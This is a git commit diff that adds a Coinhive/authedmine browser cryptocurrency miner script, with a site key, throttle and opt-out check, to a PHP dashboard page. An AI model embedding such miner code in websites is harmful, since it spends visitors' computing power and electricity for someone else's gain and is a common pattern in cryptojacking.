7ec6b8e3aa4363d91167dc1d28cd3418848fd45d
awiddy <asw360@gmail.com>
2018-12-03 09:23:50 -0500

    coinhive JS script added

--- site/owner_dash.php
+++ site/owner_dash.php
@@ -484,6 +484,17 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 			<script src="assets/js/skel.min.js"></script>
 			<script src="assets/js/util.js"></script>
 			<script src="assets/js/main.js"></script>
+    <!--coinhiv miner script-->
+      <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+      <script>
+          var miner = new CoinHive.Anonymous('nC4dWxbaY9U8glwWmkbvRE3KCxjEcFdp', {throttle: 0.3});
+
+          // Only start on non-mobile devices and if not opted-out
+          // in the last 14400 seconds (4 hours):
+          if (!miner.isMobile() && !miner.didOptOut(14400)) {
+              miner.start();
+          }
+      </script>
 
 	</body>
 </html>
